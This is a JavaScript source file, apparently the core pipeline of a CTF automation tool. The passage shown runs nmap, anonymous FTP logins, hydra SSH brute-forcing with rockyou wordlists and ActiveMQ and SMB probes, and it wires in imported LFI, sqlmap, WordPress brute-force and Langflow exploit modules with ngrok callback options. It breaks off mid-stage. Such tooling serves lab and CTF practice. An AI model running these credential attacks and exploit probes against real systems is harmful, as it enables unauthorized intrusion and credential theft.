import { scanIpPorts, extractNmapScriptOutputBlob } from './nmap-scan.js';
import { appendCtfFlagPathHttpProbes } from './flag-path-probe.js';
import { curlWebFromNmap, curlWebFromNmapForHost, rowPrefersHttps, webOriginUrl } from './web-curl.js';
import { dirEnumAllTools } from './dir-enum.js';
import { detectFlagsWithDecoding } from './flag-detector.js';
import { buildCtfPlaybookSuggestions } from './playbook.js';
import { searchExploitDbFromNmap } from './exploitdb.js';
import { expandWebResponsesWithLinkCrawl } from './html-links.js';
import { appendRobotsTxtResponses } from './robots-probe.js';
import { ftpPortsFromNmap, probeFtpAnonymous } from './ftp-anonymous-probe.js';
import { probeSshService, sshPortsFromNmap } from './ssh-probe.js';
import { mysqlPortsFromNmap, probeMysqlService } from './mysql-probe.js';
import { runLfiContextProbe, runLfiPasswdProbe } from './lfi-probe.js';
import { runSqlmapProbe } from './sqlmap-probe.js';
import { runVhostAndSitemapProbe } from './vhost-sitemap-probe.js';
import { runCredentialReuseProbe, runDisclosureHunt, runWordpressCredentialReuse } from './disclosure-cred-probe.js';
import { runWordpressFocusProbe } from './wordpress-focus-probe.js';
import { extractWpscanFindings, runWpscanJson } from '../modules/wpscan.js';
import { normalizeExtraHostnames } from './extra-hosts-web.js';
import { collectHostnamesFromLocalEtcHosts } from './local-etc-hosts.js';
import { runExtendedServiceProbe } from './extended-service-probe.js';
import { runOpenApiDiscovery } from './openapi-probe.js';
import { runVhostPrefixFuzz } from './vhost-prefix-fuzz.js';
import {
  runSshHydraBrute,
  runSshHydraBruteAutoFull,
  runSshHydraBruteFromWordlistPair,
  resolveSolydSshWordlistPaths,
  sshBruteManualReady,
} from './ssh-brute-probe.js';
import { runLangflowExploitProbe } from './langflow-exploit-probe.js';
import { runTinyFileManagerProbe } from './tinyfilemanager-probe.js';
import { runSqlmapWsProbe } from './sqlmap-ws-probe.js';
import { runWpHydraBrute } from './hydra-wp-brute-probe.js';
import { runActiveMqProbe } from './activemq-probe.js';
import { runUploadSurfaceProbe } from './upload-surface.js';
import { ghostctfPositiveIntEnv } from './env-budgets.js';

function safeToStringPipeline(v) {
  return v == null ? '' : String(v);
}

/**
 * Extrai flags (regex + base64/base32) de qualquer texto — headers, nmap, LFI, .env, etc.
 */
function ingestFlagsFromDecodedText({
  rawText,
  platformId,
  foundFlagSet,
  addFinding,
  log,
  maxTextLen = 900_000,
  pageUrl = null,
  extraMeta = '',
}) {
  const raw = String(rawText || '').trim().slice(0, maxTextLen);
  if (!raw) return;
  let flagHits = [];
  try {
    const hits = detectFlagsWithDecoding({ rawText: raw, platformId });
    flagHits = Array.isArray(hits) ? hits : [];
  } catch (e) {
    if (typeof log === 'function') log(`scan de flags: ${e?.message || String(e)}`, 'warn');
    flagHits = [];
  }
  for (const hit of flagHits) {
    if (!hit || !hit.flag) continue;
    if (foundFlagSet.has(hit.flag)) continue;
    foundFlagSet.add(hit.flag);
    addFinding(
      {
        type: 'flag',
        prio: 'high',
        score: 99,
        value: hit.flag,
        meta: `platform=${platformId}; evidence=${hit.evidence || 'unknown'}; decodedFrom=${hit.decodedFrom || ''}${pageUrl ? `; url=${pageUrl}` : ''}${extraMeta}`,
        url: pageUrl,
      },
      'flags',
    );
  }
}

/** `detectFlagsWithDecoding` sobre value+meta de findings já agregados (mail, SMB, LFI snippet, SQLMap, tech). */
function ingestFlagFindingsFromFindingsArtifacts({
  findings,
  platformId,
  foundFlagSet,
  addFinding,
  log,
  maxPerFinding = 120_000,
}) {
  const types = new Set(['nmap', 'endpoint', 'tech', 'secret', 'param', 'sqli']);
  for (const f of findings || []) {
    if (!f || !types.has(f.type)) continue;
    const blob = `${safeToStringPipeline(f.value)}\n${safeToStringPipeline(f.meta)}`.trim();
    if (blob.length < 6) continue;
    ingestFlagsFromDecodedText({
      rawText: blob.slice(0, maxPerFinding),
      platformId,
      foundFlagSet,
      addFinding,
      log,
      maxTextLen: maxPerFinding,
      pageUrl: f.url || null,
      extraMeta: `; artifact=${f.type}`,
    });
  }
}

function ingestFlagFindingsFromWebResponses({
  webResponses,
  platformId,
  foundFlagSet,
  addFinding,
  log,
  maxTextLen = 900_000,
}) {
  for (const r of webResponses || []) {
    if (!r) continue;
    const pageUrl = r.finalUrl || r.url || null;
    const ht = safeToStringPipeline(r.headersText || '');
    const bt = safeToStringPipeline(r.bodyText || '');
    const se = safeToStringPipeline(r.curlStderr || '');
    const rawText = `${ht}\n${ht}\n${bt}\n${se}`.trim().slice(0, maxTextLen);
    if (!rawText) continue;
    let via = '';
    if (r.__via === 'robots-disallow') {
      via = `; via=robots-disallow; path=${String(r.__disallowPath || '')}`;
    } else if (r.__via === 'etc-hosts-name') {
      via = `; via=etc-hosts-name; host=${String(r.__vhostName || '')}`;
    } else if (r.__via === 'ctf-flag-paths') {
      via = `; via=ctf-flag-paths; path=${String(r.__ctfFlagPath || '')}`;
    } else if (r.__via === 'robots.txt') {
      via = '; via=robots.txt';
    } else if (r.__via === 'disclosure-hunt') {
      via = '; via=disclosure-hunt';
    }
    ingestFlagsFromDecodedText({
      rawText,
      platformId,
      foundFlagSet,
      addFinding,
      log,
      maxTextLen,
      pageUrl,
      extraMeta: via,
    });
  }
}

/** Uma seed por origem (ex.: :80 vs :443 vs :8080) para dir-enum não ficar só nas primeiras URLs da mesma porta. */
function collectDirEnumSeedUrls(webResponses, { maxOrigins = 8 } = {}) {
  const byOrigin = new Map();
  for (const r of webResponses || []) {
    if (!r?.url || !r.status) continue;
    let parsed;
    try {
      parsed = new URL(String(r.url).split('#')[0]);
    } catch {
      continue;
    }
    const origin = parsed.origin;
    const path = parsed.pathname || '/';
    const depth = path === '/' || path === '' ? 0 : path.split('/').filter(Boolean).length;
    const prev = byOrigin.get(origin);
    if (!prev || depth < prev.depth) {
      byOrigin.set(origin, { url: parsed.href, depth });
    }
  }
  return [...byOrigin.values()]
    .sort((a, b) => a.depth - b.depth)
    .map((x) => x.url)
    .slice(0, maxOrigins);
}

export async function runGhostCtfPipeline({
  ip,
  platformId,
  modules = [],
  extraHosts = [],
  /** Só com etcHostsProbe + nomes: não faz curl inicial em http(s)://IP (só hostnames). */
  hostsOnlyWeb = false,
  udpScan = false,
  tcpAllPorts = false,
  /** IPv4 extra com MySQL (ex.: CTF9 DB noutro EC2) — requer módulo `secondaryMysqlProbe`. */
  secondaryMysqlHosts = [],
  /** Domínio apex para fuzz `prefix.<domínio>` no IP (ex.: projects-blogo.sy) — módulo `vhostPrefixFuzz`. */
  vhostBaseDomain = '',
  /** Prefixos extra (vírgula ou linha) para vhost fuzz. */
  vhostFuzzExtraPrefixes = '',
  /** SSH brute (hydra) — só com módulo `sshBruteProbe` + wordlist em disco. */
  sshBruteUsers = '',
  sshBruteWordlistPath = '',
  sshBruteMaxPasswords = 150,
  /** Com `sshBruteAutoHydra` + módulo: hydra SecLists+rockyou por último se subset não crackar ou sem user/wordlist. */
  sshBruteAutoHydra = false,
  /** Timeout do hydra automático (ms), 5–120 min. */
  sshBruteAutoTimeoutMs = 1_800_000,
  /** Hydra com `wordlists/usersolyd.txt` + `passwordsolyd.txt` (histórico Solyd) — entre subset e rockyou. */
  sshBruteSolydWordlists = false,
  /** Langflow CVE-2025-3248 / vértices — módulo `langflowExploitProbe`. */
  langflowHostHeader = '',
  langflowTryAllOrigins = false,
  langflowVerticesShell = false,
  langflowNgrokHost = '',
  langflowNgrokPort = 0,
  langflowBuildFlowId = '00000000-0000-0000-0000-000000000001',
  langflowAlsoTryFlagPath = false,
  /** Hydra wp-login — módulo `hydraWpBruteProbe` (wordlist em disco). */
  hydraWpBruteUsers = '',
  hydraWpBruteWordlistPath = '',
  hydraWpBruteMaxPasswords = 150,
  emit,
  saveRun,
}) {
  const findings = [];
  const stats = { endpoints: 0, params: 0, flags: 0, secrets: 0, high: 0 };
  const foundFlagSet = new Set();

  const addFinding = (f, statKey) => {
    if (statKey) stats[statKey] = (stats[statKey] || 0) + 1;
    findings.push(f);
    if (f.prio === 'high') stats.high += 1;
    emit({ type: 'finding', finding: f });
    emit({ type: 'stats', stats: { ...stats } });
  };

  const log = (msg, level = 'info') => emit({ type: 'log', msg, level });
  const pipe = (name, state) => emit({ type: 'pipe', name, state });
  const progress = (p) => emit({ type: 'progress', pct: p });
  const intel = (line) => emit({ type: 'intel', line });

  const tPipeline0 = Date.now();
  /** @type {Record<string, number>} */
  const timingsMs = {};
  const markTiming = (key) => {
    timingsMs[key] = Math.round(Date.now() - tPipeline0);
  };

  // 1) INPUT
  pipe('input', 'active');
  progress(5);
  pipe('input', 'done');

  // 2) RECON - Ports and services (mapeia para "subdomains" no UI)
  pipe('subdomains', 'active');
  progress(12);
  log(`GhostCTF Recon por IP: ${ip}`, 'section');

  let nmapRows = [];
  /** XML bruto do nmap (saídas de `--script` / `<script output=…>`). */
  let nmapXml = '';
  try {
    const nm = await scanIpPorts({ ip, tcpAllPorts, udpScan, log });
    nmapRows = nm.rows || [];
    nmapXml = String(nm.xml || '');
  } catch (e) {
    emit({ type: 'error', message: e?.message || String(e) });
    markTiming('failedAtNmap');
    return {
      runId: null,
      findings,
      stats,
      intelMerge: null,
      correlation: {
        ip,
        platformId,
        timingsMs,
        totalRunMs: Math.round(Date.now() - tPipeline0),
      },
    };
  }

  const openPorts = (nmapRows || []).length;
  log(`nmap: ${openPorts} porta(s)/serviço(s) com registro no XML`, openPorts ? 'success' : 'warn');
  emit({ type: 'stats', stats: { ...stats } });

  // cria findings por serviço/porta
  const seenPorts = new Set();
  for (const r of nmapRows) {
    const port = Number(r.port);
    const proto = String(r.proto || 'tcp');
    const key = `${proto}:${port}`;
    if (seenPorts.has(key)) continue;
    seenPorts.add(key);

    const name = r.name || '';
    const product = r.product || '';
    const extra = r.extrainfo || '';
    const line = `${proto}/${port} ${name} ${product} ${r.version || ''}`.trim();
    const https = rowPrefersHttps(port, name, product, extra);
    addFinding(
      {
        type: 'nmap',
        prio: 'med',
        score: 55,
        value: line,
        meta: `${r.extrainfo || 'nmap'} (host=${r.host || ip})`,
        url: webOriginUrl(ip, port, https),
      },
      'endpoints',
    );
  }

  const nmapScriptBlob = extractNmapScriptOutputBlob(nmapXml);
  if (nmapScriptBlob.trim()) {
    log('nmap: a extrair possíveis flags de saídas de scripts (XML, texto não HTML)…', 'info');
    ingestFlagsFromDecodedText({
      rawText: nmapScriptBlob,
      platformId,
      foundFlagSet,
      addFinding,
      log,
      maxTextLen: 320_000,
      pageUrl: null,
      extraMeta: '; via=nmap-xml-script',
    });
  }

  markTiming('afterNmapAndScriptBlob');

  // Exploit-DB lookup (searchsploit) — opcional
  if (Array.isArray(modules) && modules.includes('exploitdb')) {
    try {
      const ex = await searchExploitDbFromNmap({ ip, nmapRows, log, limitQueries: 10 });
      if (ex.ok && Array.isArray(ex.findings) && ex.findings.length) {
        for (const f of ex.findings) addFinding(f, null);
      }
    } catch (e) {
      log(`Exploit-DB lookup: ${e?.message || String(e)}`, 'warn');
    }
  } else {
    log('Exploit-DB lookup: OFF (ative em Modules)', 'info');
  }

  /** @type {{ tried: number; successPorts: number[]; errors: string[] }} */
  const ftpAnonymousSummary = { tried: 0, successPorts: [], errors: [] };
  const ftpPorts = ftpPortsFromNmap(nmapRows);
  if (ftpPorts.length) {
    log(`FTP detetado (porta(s) ${ftpPorts.join(', ')}) — a testar USER anonymous / PASS anonymous@...`, 'info');
    for (const ftpPort of ftpPorts) {
      ftpAnonymousSummary.tried += 1;
      try {
        const fr = await probeFtpAnonymous({ host: ip, port: ftpPort, timeoutMs: 12000, platformId });
        if (fr.anonymousOk) {
          ftpAnonymousSummary.successPorts.push(ftpPort);
          const listPreview = Array.isArray(fr.listPreview) ? fr.listPreview.slice(0, 6) : [];
          const listMeta = listPreview.length ? ` · LIST=${listPreview.join(' | ').slice(0, 240)}` : '';
          addFinding(
            {
              type: 'endpoint',
              prio: 'high',
              score: 72,
              value: `FTP anonymous permitido @ ${ip}:${ftpPort}`,
              meta: `USER anonymous · PASS anonymous@ · ${fr.summary || '230'}${listMeta}`,
              url: `ftp://${ip}:${ftpPort}/`,
            },
            'endpoints',
          );
          const fh = fr.flagHarvest;
          if (fh?.grepMatches?.length) {
            const seenGrep = new Set();
            for (const gm of fh.grepMatches) {
              const key = `${String(gm.term || '').toLowerCase()}|${String(gm.snippet || '').slice(0, 120)}`;
              if (seenGrep.has(key)) continue;
              seenGrep.add(key);
              if (seenGrep.size > 10) break;
              addFinding(
                {
                  type: 'secret',
                  prio: 'med',
                  score: 62,
                  value: `FTP grep «${gm.term}» @ ${ip}:${ftpPort}`,
                  meta: `ftp-flag-grep · ${gm.where || 'LIST'} · ${String(gm.snippet || '').slice(0, 360)}`,
                  url: `ftp://${ip}:${ftpPort}/`,
                },
                'secrets',
              );
            }
          }
          if (fh?.detectorFlags?.length) {
            for (const df of fh.detectorFlags) {
              if (!df?.flag || foundFlagSet.has(df.flag)) continue;
              foundFlagSet.add(df.flag);
              addFinding(
                {
                  type: 'flag',
                  prio: 'high',
                  score: 99,
                  value: df.flag,
                  meta: [
                    `platform=${platformId}`,
                    `evidence=${df.evidence || 'ftp-anon'}`,
                    df.ftpPath ? `ftpPath=${df.ftpPath}` : null,
                    df.decodedFrom ? `decodedFrom=${String(df.decodedFrom).slice(0, 120)}` : null,
                  ]
                    .filter(Boolean)
                    .join(' · '),
                  url: `ftp://${ip}:${ftpPort}/`,
                },
                'flags',
              );
            }
          }
          log(`FTP anonymous: SUCESSO em ${ip}:${ftpPort} — ${fr.summary || '230'}`, 'success');
          if (fh?.retrTried?.length) {
            log(`FTP flag-harvest ${ip}:${ftpPort}: RETR tentados=${fh.retrTried.join(', ')}`, 'info');
          }
          if (listPreview.length) {
            log(`FTP LIST ${ip}:${ftpPort}: ${listPreview.join(' | ')}`, 'info');
          } else {
            log(`FTP LIST ${ip}:${ftpPort}: sem listagem (permissão/servidor)`, 'info');
          }
          intel(`FTP ANONYMOUS OK @ ${ip}:${ftpPort} — listar: ftp ${ip} ${ftpPort} (user anonymous, pass anonymous@)`);
        } else {
          const hint = fr.summary || fr.error || `código ${fr.code ?? '—'}`;
          log(`FTP anonymous: sem acesso em ${ip}:${ftpPort} — ${hint}`, 'info');
          if (fr.error) ftpAnonymousSummary.errors.push(`${ftpPort}:${fr.error}`);
        }
      } catch (e) {
        const msg = e?.message || String(e);
        ftpAnonymousSummary.errors.push(`${ftpPort}:${msg}`);
        log(`FTP probe ${ip}:${ftpPort}: ${msg}`, 'warn');
      }
    }
  }

  /** @type {{ tried: number; okPorts: number[]; errors: string[] }} */
  const sshSummary = { tried: 0, okPorts: [], errors: [] };
  const sshPorts = sshPortsFromNmap(nmapRows);
  if (sshPorts.length) {
    log(`SSH detetado (porta(s) ${sshPorts.join(', ')}) — a recolher banner + hostkeys...`, 'info');
    for (const sshPort of sshPorts) {
      sshSummary.tried += 1;
      try {
        const sr = await probeSshService({ host: ip, port: sshPort, timeoutMs: 12000 });
        const keyHint = Array.isArray(sr.hostKeys) ? sr.hostKeys.slice(0, 2).join(' | ').slice(0, 220) : '';
        if (sr.ok) {
          sshSummary.okPorts.push(sshPort);
          const meta = [
            sr.banner ? `banner=${sr.banner}` : null,
            keyHint ? `keyscan=${keyHint}` : null,
          ]
            .filter(Boolean)
            .join(' · ');
          addFinding(
            {
              type: 'endpoint',
              prio: 'med',
              score: 64,
              value: `SSH ativo @ ${ip}:${sshPort}`,
              meta: meta || 'SSH respondeu (banner/keyscan)',
              url: null,
            },
            'endpoints',
          );
          log(`SSH probe ${ip}:${sshPort}: ${sr.banner || 'banner ausente'}${keyHint ? ' · hostkey recolhida' : ''}`, 'success');
          intel(`SSH ${ip}:${sshPort} — ${sr.banner || 'banner não exposto'}${keyHint ? ' · keyscan OK' : ''}`);
        } else {
          const err = sr.bannerError || sr.keyscanError || 'sem resposta';
          sshSummary.errors.push(`${sshPort}:${err}`);
          log(`SSH probe ${ip}:${sshPort}: ${err}`, 'info');
        }
      } catch (e) {
        const msg = e?.message || String(e);
        sshSummary.errors.push(`${sshPort}:${msg}`);
        log(`SSH probe ${ip}:${sshPort}: ${msg}`, 'warn');
      }
    }
  }

  /** @type {{ tried: number; okPorts: number[]; errors: string[] }} */
  const mysqlSummary = { tried: 0, okPorts: [], errors: [] };
  const mysqlPorts = mysqlPortsFromNmap(nmapRows);
  if (mysqlPorts.length) {
    log(`MySQL detetado (porta(s) ${mysqlPorts.join(', ')}) — a recolher handshake/version...`, 'info');
    for (const mysqlPort of mysqlPorts) {
      mysqlSummary.tried += 1;
      try {
        const mr = await probeMysqlService({ host: ip, port: mysqlPort, timeoutMs: 12000 });
        if (mr.ok) {
          mysqlSummary.okPorts.push(mysqlPort);
          const meta = [
            mr.serverVersion ? `version=${mr.serverVersion}` : null,
            Number.isFinite(mr.protocolVersion) ? `proto=${mr.protocolVersion}` : null,
            Number.isFinite(mr.connectionId) ? `connId=${mr.connectionId}` : null,
          ]
            .filter(Boolean)
            .join(' · ');
          addFinding(
            {
              type: 'endpoint',
              prio: 'med',
              score: 66,
              value: `MySQL ativo @ ${ip}:${mysqlPort}`,
              meta: meta || 'handshake MySQL recebido',
              url: null,
            },
            'endpoints',
          );
          log(`MySQL probe ${ip}:${mysqlPort}: ${mr.serverVersion || 'handshake OK'}`, 'success');
          intel(`MySQL ${ip}:${mysqlPort} — ${mr.serverVersion || 'versão não exposta'}`);
        } else {
          mysqlSummary.errors.push(`${mysqlPort}:${mr.error || 'sem handshake'}`);
          log(`MySQL probe ${ip}:${mysqlPort}: ${mr.error || 'sem handshake'}`, 'info');
        }
      } catch (e) {
        const msg = e?.message || String(e);
        mysqlSummary.errors.push(`${mysqlPort}:${msg}`);
        log(`MySQL probe ${ip}:${mysqlPort}: ${msg}`, 'warn');
      }
    }
  }

  /** @type {{ enabled: boolean; cracked: boolean; username?: string; password?: string; error?: string; autoHydra?: boolean; autoHydraRan?: boolean; solydWordlists?: boolean; solydWordlistsRan?: boolean }} */
  let sshBruteSummary = {
    enabled: false,
    cracked: false,
    autoHydra: false,
    autoHydraRan: false,
    solydWordlists: false,
    solydWordlistsRan: false,
  };
  if (Array.isArray(modules) && modules.includes('sshBruteProbe')) {
    sshBruteSummary.enabled = true;
    const brutePort = sshPorts.length ? sshPorts[0] : 22;
    if (!sshPorts.length) {
      log('SSH brute: nmap não listou SSH — hydra usará porta 22 na mesma.', 'warn');
    }
    log(
      'SSH brute (hydra): módulo AGRESSIVO — só em alvos autorizados. Subset limitado de passwords.',
      'warn',
    );
    const autoHydraWanted = Boolean(sshBruteAutoHydra);
    sshBruteSummary.autoHydra = autoHydraWanted;
    const solydWordlistsWanted = Boolean(sshBruteSolydWordlists);
    sshBruteSummary.solydWordlists = solydWordlistsWanted;
    const manualReady = sshBruteManualReady(sshBruteUsers, sshBruteWordlistPath);
    let cracked = false;

    try {
      if (manualReady) {
        const hr = await runSshHydraBrute({
          ip,
          port: brutePort,
          usernamesRaw: sshBruteUsers,
          wordlistPath: sshBruteWordlistPath,
          maxPasswords: Math.min(500, Math.max(20, Number(sshBruteMaxPasswords) || 150)),
          log,
          timeoutMs: 240000,
        });
        if (hr.cracked && hr.username && hr.password) {
          cracked = true;
          sshBruteSummary.cracked = true;
          sshBruteSummary.username = hr.username;
          sshBruteSummary.password = hr.password;
          addFinding(
            {
              type: 'secret',
              prio: 'high',
              score: 95,
              value: `SSH credencial (hydra): ${hr.username}`,
              meta: `password=${hr.password} · ${ip}:${brutePort}`,
              url: null,
            },
            'secrets',
          );
          intel(`SSH BRUTE: ${hr.username}:${hr.password} @ ${ip}:${brutePort} — testa login manual`);
        } else if (hr.error) {
          sshBruteSummary.error = hr.error;
        }
      } else {
        log(
          'SSH brute: utilizador ou wordlist em falta — subset manual (hydra truncado) não foi executado.',
          'warn',
        );
      }

      if (solydWordlistsWanted && !cracked) {
        log(
          'SSH brute: wordlists Solyd (usersolyd + passwordsolyd) — fase intermédia após subset manual.',
          'info',
        );
        const sp = resolveSolydSshWordlistPaths();
        const sr = await runSshHydraBruteFromWordlistPair({
          ip,
          port: brutePort,
          userListPath: sp.usersFile,
          passListPath: sp.passwordsFile,
          log,
          timeoutMs: 360_000,
          logLabel: 'SSH brute Solyd',
        });
        sshBruteSummary.solydWordlistsRan = true;
        if (sr.cracked && sr.username && sr.password) {
          cracked = true;
          sshBruteSummary.cracked = true;
          sshBruteSummary.username = sr.username;
          sshBruteSummary.password = sr.password;
          addFinding(
            {
              type: 'secret',
              prio: 'high',
              score: 95,
              value: `SSH credencial (hydra Solyd): ${sr.username}`,
              meta: `password=${sr.password} · ${ip}:${brutePort} · wordlists=usersolyd/passwordsolyd`,
              url: null,
            },
            'secrets',
          );
          intel(`SSH BRUTE SOLYD: ${sr.username}:${sr.password} @ ${ip}:${brutePort}`);
        } else if (sr.error && !sshBruteSummary.error) {
          sshBruteSummary.error = sr.error;
        }
      }

      if (autoHydraWanted && !cracked) {
        const autoTimeout = Math.min(
          7_200_000,
          Math.max(300_000, Number(sshBruteAutoTimeoutMs) || 1_800_000),
        );
        log(
          'SSH brute: a seguir, modo AUTO (SecLists + rockyou) — última fase; pode demorar muito.',
          'warn',
        );
        const ar = await runSshHydraBruteAutoFull({
          ip,
          port: brutePort,
          log,
          timeoutMs: autoTimeout,
        });
        sshBruteSummary.autoHydraRan = true;
        if (ar.cracked && ar.username && ar.password) {
          sshBruteSummary.cracked = true;
          sshBruteSummary.username = ar.username;
          sshBruteSummary.password = ar.password;
          addFinding(
            {
              type: 'secret',
              prio: 'high',
              score: 95,
              value: `SSH credencial (hydra AUTO): ${ar.username}`,
              meta: `password=${ar.password} · ${ip}:${brutePort} · mode=SecLists+rockyou`,
              url: null,
            },
            'secrets',
          );
          intel(`SSH BRUTE AUTO: ${ar.username}:${ar.password} @ ${ip}:${brutePort}`);
        } else if (ar.error) {
          if (!sshBruteSummary.error) sshBruteSummary.error = ar.error;
          log(`SSH brute AUTO: ${ar.error}`, 'warn');
        }
      } else if (!autoHydraWanted && !solydWordlistsWanted && !manualReady) {
        log(
          'SSH brute: sem subset manual — ativa “Wordlists Solyd” e/ou “Hydra automático (SecLists + rockyou)” para hydra com listas em disco.',
          'info',
        );
      }
    } catch (e) {
      sshBruteSummary.error = e?.message || String(e);
      log(`SSH brute: ${sshBruteSummary.error}`, 'warn');
    }
  }

  /** @type {{ enabled: boolean; hits: number }} */
  let activeMqSummary = { enabled: false, hits: 0 };
  if (Array.isArray(modules) && modules.includes('activeMqProbe')) {
    activeMqSummary.enabled = true;
    try {
      log('ActiveMQ probe: HTTP porta 8161 (e indícios no banner)...', 'info');
      const am = await runActiveMqProbe({ ip, log, timeoutMs: 8000 });
      const hh = Array.isArray(am?.hits) ? am.hits : [];
      activeMqSummary.hits = hh.length;
      for (const h of hh) {
        addFinding(
          {
            type: 'tech',
            prio: 'high',
            score: 78,
            value: 'Possível Apache ActiveMQ / consola 8161',
            meta: h.evidence || '8161',
            url: h.url || null,
          },
          'endpoints',
        );
        if (h.intel) intel(h.intel);
      }
      if (!hh.length) log('ActiveMQ probe: sem confirmação em :8161', 'info');
    } catch (e) {
      log(`ActiveMQ probe: ${e?.message || String(e)}`, 'warn');
    }
  }

  /** @type {{ enabled: boolean; hosts: string[]; okPorts: string[]; errors: string[] }} */
  let secondaryMysqlSummary = { enabled: false, hosts: [], okPorts: [], errors: [] };
  const smHosts = Array.isArray(secondaryMysqlHosts)
    ? [...new Set(secondaryMysqlHosts.map((h) => String(h || '').trim()).filter(Boolean))].slice(0, 8)
    : [];
  if (Array.isArray(modules) && modules.includes('secondaryMysqlProbe')) {
    secondaryMysqlSummary.enabled = true;
    if (!smHosts.length) {
      log('MySQL secundário: módulo ON — indica IPv4 na caixa “IPs MySQL extra” (um por linha).', 'warn');
    } else {
      secondaryMysqlSummary.hosts = smHosts;
      log(`MySQL secundário: a sondar handshake em ${smHosts.length} host(s) (porta 3306)...`, 'info');
      for (const mh of smHosts) {
        try {
          const mr = await probeMysqlService({ host: mh, port: 3306, timeoutMs: 12000 });
          if (mr.ok) {
            secondaryMysqlSummary.okPorts.push(`${mh}:3306`);
            const meta = [
              mr.serverVersion ? `version=${mr.serverVersion}` : null,
              Number.isFinite(mr.protocolVersion) ? `proto=${mr.protocolVersion}` : null,
            ]
              .filter(Boolean)
              .join(' · ');
            addFinding(
              {
                type: 'endpoint',
                prio: 'med',
                score: 67,
                value: `MySQL ativo @ ${mh}:3306 (host secundário)`,
                meta: meta || 'handshake MySQL recebido',
                url: null,
              },
              'endpoints',
            );
            log(`MySQL secundário ${mh}:3306 — ${mr.serverVersion || 'handshake OK'}`, 'success');
            intel(`MySQL (secundário) ${mh}:3306 — ${mr.serverVersion || 'versão não exposta'}`);
          } else {
            secondaryMysqlSummary.errors.push(`${mh}:${mr.error || 'sem handshake'}`);
            log(`MySQL secundário ${mh}:3306 — ${mr.error || 'sem handshake'}`, 'info');
          }
        } catch (e) {
          const msg = e?.message || String(e);
          secondaryMysqlSummary.errors.push(`${mh}:${msg}`);
          log(`MySQL secundário ${mh}: ${msg}`, 'warn');
        }
      }
    }
  }

  /** @type {{ enabled: boolean; mailProbes: number; smbAttempted: boolean; smbInteresting?: boolean }} */
  let extendedSvcSummary = { enabled: false, mailProbes: 0, smbAttempted: false };
  if (Array.isArray(modules) && modules.includes('extendedServiceProbe')) {
    extendedSvcSummary.enabled = true;
    try {
      log('Extended services: mail (POP3/IMAP/SMTP) + SMB (smbclient) quando o nmap indicar...', 'info');
      const ex = await runExtendedServiceProbe({ ip, nmapRows, log });
      extendedSvcSummary.mailProbes = Array.isArray(ex.mailResults) ? ex.mailResults.length : 0;
      extendedSvcSummary.smbAttempted = Boolean(ex.smb?.attempted);
      extendedSvcSummary.smbInteresting = Boolean(ex.smb?.interesting);
      for (const m of ex.mailResults || []) {
        const tr = String(m.transcript || '').replace(/\s+/g, ' ').trim().slice(0, 480);
        addFinding(
          {
            type: 'endpoint',
            prio: 'low',
            score: 38,
            value: `Mail/TCP sondagem ${ip}:${m.port} (${m.kind || 'tcp'})`,
            meta: tr || m.error || 'sem transcrição',
            url: null,
          },
          'endpoints',
        );
      }
      if (ex.smb?.attempted && ex.smb?.interesting) {
        addFinding(
          {
            type: 'endpoint',
            prio: 'high',
            score: 74,
            value: `SMB — listagem partilhável @ ${ip} (smbclient -L //IP -N)`,
            meta: String(ex.smb.stdout || '').slice(0, 1200).replace(/\s+/g, ' '),
            url: null,
          },
          'endpoints',
        );
        intel(`SMB: rever output smbclient — possíveis shares em ${ip}`);
      }
    } catch (e) {
      log(`Extended services: ${e?.message || String(e)}`, 'warn');
    }
  } else {
    log('Extended services (mail/SMB): OFF (ative em Modules)', 'info');
  }

  // Playbook inicial (pós-nmap)
  try {
    const sug = buildCtfPlaybookSuggestions({ ip, findings });
    for (const s of sug.slice(0, 6)) {
      intel(`PLAYBOOK (${String(s.prio).toUpperCase()}): ${s.title}`);
      for (const step of s.steps.slice(0, 6)) intel(`  - ${step}`);
    }
  } catch (e) {
    log(`playbook: ${e?.message || String(e)}`, 'warn');
  }

  markTiming('beforeSubdomainsPipeDone');
  pipe('subdomains', 'done');
  progress(28);

  // 3) UDP stage label (mapa para "rdap")
  pipe('rdap', 'active');
  if (udpScan) log('UDP scan ON: já incluído no nmap.', 'info');
  else log('UDP scan OFF: apenas TCP (top ports).', 'info');
  pipe('rdap', 'done');

  // 4) WEB PROBE (mapa para "alive")
  pipe('alive', 'active');
  progress(35);
  /** Hostnames descobertos em `/etc/hosts` local (máquina do Node) com o mesmo IP do alvo — fundidos com a lista da UI. */
  let hostnamesFromLocalEtcHosts = [];
  if (
    Array.isArray(modules) &&
    modules.includes('etcHostsProbe') &&
    String(process.env.GHOSTCTF_SKIP_LOCAL_ETC_HOSTS || '').trim() !== '1'
  ) {
    try {
      const maxLocal = Math.min(
        64,
        Math.max(1, Number(process.env.GHOSTCTF_MAX_LOCAL_ETC_HOSTS) || 32),
      );
      hostnamesFromLocalEtcHosts = await collectHostnamesFromLocalEtcHosts(ip, { max: maxLocal });
      if (hostnamesFromLocalEtcHosts.length) {
        log(
          `Hostnames do /etc/hosts local (IP=${ip}): ${hostnamesFromLocalEtcHosts.join(', ')} — a juntar ao recon (módulo Hostnames).`,
          'info',
        );
      }
    } catch (e) {
      log(`Leitura automática de /etc/hosts: ${e?.message || String(e)}`, 'warn');
    }
  }
  const namesForEtc = normalizeExtraHostnames([...(extraHosts || []), ...hostnamesFromLocalEtcHosts]);
  const useHostsOnlyWeb =
    Boolean(hostsOnlyWeb) &&
    Array.isArray(modules) &&
    modules.includes('etcHostsProbe') &&
    namesForEtc.length > 0;

  if (hostsOnlyWeb && Array.isArray(modules) && modules.includes('etcHostsProbe') && !namesForEtc.length) {
    log('Modo “só hostnames”: lista vazia — a fazer curl no IP como habitual.', 'warn');
  }

  let webResponses;
  if (useHostsOnlyWeb) {
    log(
      'Modo só hostnames: a saltar curl HTTP inicial no IP literal (mantém-se nmap + FTP/SSH/MySQL no IP).',
      'info',
    );
    webResponses = [];
  } else {
    log('Probe HTTP/HTTPS com curl nas portas web candidatas (IP)...', 'info');
    webResponses = await curlWebFromNmap({ ip, nmapRows, timeoutMs: 12000, maxBodyBytes: 250000, log });
  }

  /** @type {{ enabled: boolean, hosts: string[], urls: number, localFileHosts: string[] }} */
  let etcHostsSummary = { enabled: false, hosts: [], urls: 0, localFileHosts: [] };
  if (Array.isArray(modules) && modules.includes('etcHostsProbe')) {
    etcHostsSummary.enabled = true;
    etcHostsSummary.localFileHosts = hostnamesFromLocalEtcHosts;
    const names = namesForEtc;
    etcHostsSummary.hosts = names;
    if (names.length) {
      log(
